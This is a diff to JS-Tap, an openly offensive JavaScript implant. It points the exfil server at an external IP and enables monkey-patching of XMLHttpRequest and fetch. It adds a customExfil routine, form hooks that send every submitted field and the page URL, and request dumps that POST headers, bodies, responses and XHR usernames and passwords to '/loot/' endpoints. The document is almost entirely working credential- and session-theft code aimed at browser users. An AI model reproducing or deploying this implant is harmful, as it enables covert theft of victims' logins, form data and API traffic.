@@ -3,6 +3,7 @@
 // JS-Tap code below
 // Note that most of this file is the HTML2Canvas library, that's included after the JS-Tap code
 // at the bottom of the file. 
+// Note that the HTML2CANVAS uses a different software license (MIT) than JS-Tap (Unlicense)
 
 // JS-Tap license:
 // This is free and unencumbered software released into the public domain.
@@ -51,8 +52,8 @@ function initGlobals()
 	window.taperMode = "trap";
 
 	// Exfil server
-	window.taperexfilServer = "https://127.0.0.1:8444";
-	//window.taperexfilServer = "https://100.115.92.203:8444";
+	//window.taperexfilServer = "https://127.0.0.1:8444";
+	window.taperexfilServer = "https://100.115.92.203:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -78,8 +79,9 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
 		//window.taperstartingPage = "https://127.0.0.1:8443/";
+		window.taperstartingPage = "http://127.0.0.1:5000";
 	}
 	else // if implant mode
 	{
@@ -115,7 +117,7 @@ function initGlobals()
 	
 
 	// Should we try to monkey patch underlying API prototypes?
-	window.monkeyPatchAPIs = false;
+	window.monkeyPatchAPIs = true;
 
 
 	// Should we capture a screenshot after a delay after an API call?
@@ -195,6 +197,21 @@ function updateTaskCheckJitter(newTop, newBottom)
 
 
 
+function customExfil(note, data)
+{
+	request = new window.taperXHR();
+	request.noIntercept = true;
+	request.open("POST", taperexfilServer + "/loot/customData/" + 
+		sessionStorage.getItem('taperSessionUUID'));
+	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	var jsonObj = new Object();
+	jsonObj["note"] = btoa(note);
+	jsonObj["data"] = btoa(data);
+	var jsonString = JSON.stringify(jsonObj);
+	request.send(jsonString);
+}
+
+
 function canAccessIframe(iframe) {
 	try {
 		// console.log("Trying to access iframe contentDocument...");
@@ -205,6 +222,7 @@ function canAccessIframe(iframe) {
 	}
 	catch(e){
 		// console.log("canAccessIframe returning false...");
+		customExfil('Error', 'Client cannot access Iframe');
 		return false;
 	}
 }
@@ -236,12 +254,12 @@ function sendScreenshot()
 				// console.log(this.responseText)
 			};
 
-			// request = new XMLHttpRequest();
-			request = new window.taperXHR();
-			request.noIntercept = true;
-			request.addEventListener("load", responseHandler);
-			request.open("POST", taperexfilServer + "/loot/screenshot/" + 
-				sessionStorage.getItem('taperSessionUUID'));
+			// // request = new XMLHttpRequest();
+			// request = new window.taperXHR();
+			// request.noIntercept = true;
+			// request.addEventListener("load", responseHandler);
+			// request.open("POST", taperexfilServer + "/loot/screenshot/" + 
+			// 	sessionStorage.getItem('taperSessionUUID'));
 
 
 			// Helps hide flashing of the page when clicking around
@@ -256,6 +274,13 @@ function sendScreenshot()
 
 			canvas.toBlob((blob) => 
 			{
+				// request = new XMLHttpRequest();
+				request = new window.taperXHR();
+				request.noIntercept = true;
+				request.addEventListener("load", responseHandler);
+				request.open("POST", taperexfilServer + "/loot/screenshot/" + 
+				sessionStorage.getItem('taperSessionUUID'));
+
 				const image = blob;
 				request.send(image);
 			});
@@ -347,22 +372,22 @@ function hookForms()
 
 	// Function to handle form submission
 		function interceptFormSubmit(event) {
-	    // Prevent the form from submitting
-		//event.preventDefault();
 
 	    // Log form action for debugging
 	    // console.log('Form action:', event.target.getAttribute('action'));
 	    // console.log('Form method:', event.target.method.toUpperCase());
 
-			var action = event.target.getAttribute('action');
-			var method = event.target.method.toUpperCase();
+			var name    = event.target.name;
+			var action  = event.target.getAttribute('action');
+			var method  = event.target.method.toUpperCase();
+			var encType = event.target.enctype;
 
 			var data = "";
 
 			var formData = new FormData(event.target);
 			for (let [name, value] of formData.entries()) 
 			{
-	        // console.log(`${name}: ${value}`);
+	        	//console.log(`${name}: ${value}`);
 				data += name + ": " + value + '\n';
 			}
 
@@ -375,10 +400,9 @@ function hookForms()
 			jsonObj["action"] = btoa(action);
 			jsonObj["method"] = method;
 			jsonObj["data"]   = btoa(data);
-			var jsonString = JSON.stringify(jsonObj);
+			jsonObj["url"]    = myReference.location.href;
+			var jsonString    = JSON.stringify(jsonObj);
 			request.send(jsonString);
-
-	  //  event.target.submit();
 		}
 
 	// Attach the event listener to all forms
@@ -393,6 +417,24 @@ function hookForms()
 		}
 	}
 }
+
+
+
+
+function getCookie(name) 
+{
+    let nameEQ = name + "=";
+    let cookieArray = document.cookie.split(';');
+    for(let i = 0; i < cookieArray.length; i++) 
+    {
+        let cookie = cookieArray[i];
+        // Trim spaces and see if this cookie string begins with the cookie name we're looking for
+        while (cookie.charAt(0) === ' ') cookie = cookie.substring(1);
+        if (cookie.indexOf(nameEQ) === 0) return cookie.substring(nameEQ.length, cookie.length);
+    }
+    return null; // Return null if not found
+}
+
 
 
 
@@ -843,6 +885,8 @@ function getFetchReference()
 }
 
 
+// For saving up data about fetch calls
+const fetchDetailsMap = new Map();
 
 
 // Fetch API wrapper for monkey patching
@@ -855,44 +899,19 @@ function customFetch(url, options)
 		return;
 	}
 
-	// console.log("** Cloned Fetch API call**");
-	// console.log("Fetch url: " + url);
-	// console.log("Fetch method: " + options.method);
-	// console.log("Fetch headers: " + JSON.stringify(options.headers));
-	// console.log("Fetch body: " + options.body);
-	// console.log("----------");
+	const requestId = Symbol('fetchRequest');
 
-	// send setup loot
-	request = new XMLHttpRequest();
-	request.noIntercept = true;
-	request.open("POST", taperexfilServer + "/loot/fetchSetup/" + 
-		sessionStorage.getItem('taperSessionUUID'));
-	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
-	var jsonObj = new Object();
-	jsonObj["method"] = options.method;
-	jsonObj["url"]    = url;
-	var jsonString    = JSON.stringify(jsonObj);
-	request.send(jsonString);
+	// Stash the details to report out
+	fetchDetailsMap.set(requestId, {
+		method:         options.method || 'GET',
+		url:            url,
+		headers:        options.headers,
+		body:           btoa(options.body),
+		responseStatus: null,
+		responseBody:   null
+	});
 
-	for (const key in options.headers)
-	{
-		const value = options.headers[key];
-		// console.log("**** " + key, value);
-
-		// send header loot
-		request = new XMLHttpRequest();
-		request.noIntercept = true;
-		request.open("POST", taperexfilServer + "/loot/fetchHeader/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-		var jsonObj = new Object();
-		jsonObj["header"] = key;
-		jsonObj["value"]  = value;
-		var jsonString    = JSON.stringify(jsonObj);
-		request.send(jsonString);
-	}
 
 	// Let's get the API call good stuff
 	const requestBody = options.body;
@@ -903,23 +922,26 @@ function customFetch(url, options)
 	// return fetch(url, options).then((response) => {
 	return originalFetch(url, options).then((response) => {
 		// clone response
+
+		// Setup our stash mapping
+		const details = fetchDetailsMap.get(requestId);
+		details.responseStatus = response.status;
+
 		return response.clone().text().then((body) => {
 			// console.log('Response Status:', response.status);
 			// console.log('Response Headers:', response.headers);
 			// console.log('Response Body:', body);
 
-			// send API call body loot
-			request = new XMLHttpRequest();
-			request.noIntercept = true;
-			request.open("POST", taperexfilServer + "/loot/fetchCall/" + 
-				sessionStorage.getItem('taperSessionUUID'));
-			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+			// stash it
+			details.responseBody = btoa(body);
 
-			var jsonObj = new Object();
-			jsonObj["requestBody"]  = btoa(requestBody);
-			jsonObj["responseBody"] = btoa(body);
-			var jsonString          = JSON.stringify(jsonObj);
-			request.send(jsonString);
+			// Send to whole call dump
+			var request = new XMLHttpRequest();
+	        request.open("POST", taperexfilServer + "/loot/fetchRequest/" + sessionStorage.getItem('taperSessionUUID'));
+	        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	        var jsonString = JSON.stringify(details);
+	        request.send(jsonString);
+
 
 			// Check if we should take a screenshot now
 			if (window.postApiCallScreenshot)
@@ -955,28 +977,35 @@ function monkeyPatchXHR()
 	const xhrOriginalSend      = window.XMLHttpRequest.prototype.send;
 
 
+	// Stash stuff for later access
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.requestDetails = {
+	    method: null,
+	    url: null,
+	    headers: {},
+	    body: null,
+	    async: true,
+	    user: null,
+	    password: null,
+	    responseBody: null,
+	    responseStatus: null
+	};
+
 
 	//Monkey patch open
 	// XHR monkeypatch only stable in trap mode
 	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
 	{
 		var method = arguments[0];
-		var url = arguments[1];
+		var url    = arguments[1];
 
 		// console.log("Intercepted XHR open: " + method + ", " + url);
 
-
-		// send loot
-		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-		var jsonObj = new Object();
-		jsonObj["method"] = method;
-		jsonObj["url"]    = url;
-		var jsonString    = JSON.stringify(jsonObj);
-		request.send(jsonString);
-
+		// Stash it all
+      	this.requestDetails.method   = method;
+        this.requestDetails.url      = url;
+        this.requestDetails.async    = async;
+        this.requestDetails.user     = user;
+        this.requestDetails.password = password;
 
 		xhrOriginalOpen.apply(this, arguments);
 	}
@@ -989,82 +1018,76 @@ function monkeyPatchXHR()
 		var header = arguments[0];
 		var value  = arguments[1];
 
-		// console.log("$$$ MonekeyURL: " + this.url);
-
-		// console.log("Intercepted Header = " + header + ": " + value);
-
-
-		request = new XMLHttpRequest();
-		request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + sessionStorage.getItem('taperSessionUUID'));
-		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-		var jsonObj = new Object();
-		jsonObj["header"] = header;
-		jsonObj["value"]  = value;
-		var jsonString    = JSON.stringify(jsonObj);
-		request.send(jsonString);
-
+		// Stash it
+		this.requestDetails.headers[header] = value;
 
 		xhrOriginalSetHeader.apply(this, arguments);
 	}
 
 
-  	// Monkey patch send
-	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) 
+	// Monkey patch send
+	document.getElementById("iframe_a").contentWindow.XMLHttpRequest.prototype.send = function(data) {
+	    var originalOnReadyStateChange = this.onreadystatechange;  // Save the original handler
+
+	    // Your interception logic
+	    var requestBody = btoa(data);
+
+	    // stash it
+	    this.requestDetails.body = requestBody;
+
+
+	    this.onreadystatechange = function() {
+	        // Call the original handler first, if it exists
+	        if (originalOnReadyStateChange) {
+	            originalOnReadyStateChange.apply(this, arguments);
+	        }
+
+	        // Then do your logging
+	        if (this.readyState === 4) {
+	            var data;
+
+	            if (!this.responseType || this.responseType === "text") {
+	                data = this.responseText;
+	            } else if (this.responseType === "document") {
+	                data = this.responseXML;
+	            } else if (this.responseType === "json") {
+	                data = JSON.stringify(this.response);
+	            } else {
+	                data = this.response;
+	            }
+
+	            var responseBody = btoa(data);
+
+	           	// Stash the response
+	            this.requestDetails.responseBody   = responseBody;
+	            this.requestDetails.responseStatus = this.status;
+
+
+	            // now the big dump
+	           	console.log("+++ XHR request dump: ")
+			    console.log(this.requestDetails);
+
+		        var request = new XMLHttpRequest();
+		        request.open("POST", taperexfilServer + "/loot/xhrRequest/" + sessionStorage.getItem('taperSessionUUID'));
+		        request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		        var jsonString = JSON.stringify(this.requestDetails);
+		        request.send(jsonString);
+	        }
+	    };
+
+	    xhrOriginalSend.call(this, data);  // Ensure to use the original send
+	};
+
+
+	//xhrOriginalSend.apply(this, arguments);
+
+	// Check if we should take a screenshot now
+	if (window.postApiCallScreenshot)
 	{
-		// console.log("Intercepted request body: " + data);
-
-		var requestBody = btoa(data);
-
-
-		this.onreadystatechange = function()
-		{
-			if (this.readyState === 4)
-			{
-				var data;
-
-				if (!this.responseType || this.responseType === "text") 
-				{
-					data = this.responseText;
-				} 
-				else if (this.responseType === "document") 
-				{
-					data = this.responseXML;
-				} 
-				else if (this.responseType === "json") 
-				{
-					data = JSON.stringify(this.response);
-				} 
-				else 
-				{
-					data = xhr.response;
-				}
-
-				var responseBody = btoa(data);
-				// var response = read_body(this);
-				// console.log("Intercepted response: " + data);
-
-				request = new XMLHttpRequest();
-				request.open("POST", taperexfilServer + "/loot/xhrCall/" + sessionStorage.getItem('taperSessionUUID'));
-				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-				var jsonObj = new Object();
-				jsonObj["requestBody"]  = requestBody;
-				jsonObj["responseBody"] = responseBody;
-				var jsonString          = JSON.stringify(jsonObj);
-				request.send(jsonString);
-			}
-		};
-
-		xhrOriginalSend.apply(this, arguments);
-
-		// Check if we should take a screenshot now
-		if (window.postApiCallScreenshot)
-		{
-			setTimeout(sendScreenshot, window.screenshotDelay);
-		}
+		setTimeout(sendScreenshot, window.screenshotDelay);
 	}
 }
+
 
 
 
@@ -1098,7 +1121,8 @@ async function checkTasks()
 		}
 		catch (error)
 		{
-			console.log('Error running task ' + taskId);
+			//console.log('Error running task ' + taskId);
+			customExfil('Task Error', 'Error running task ' + taskId + ': ' + error.message);
 		}
 	}
 	window.taperTaskUpdateScheduled = false;
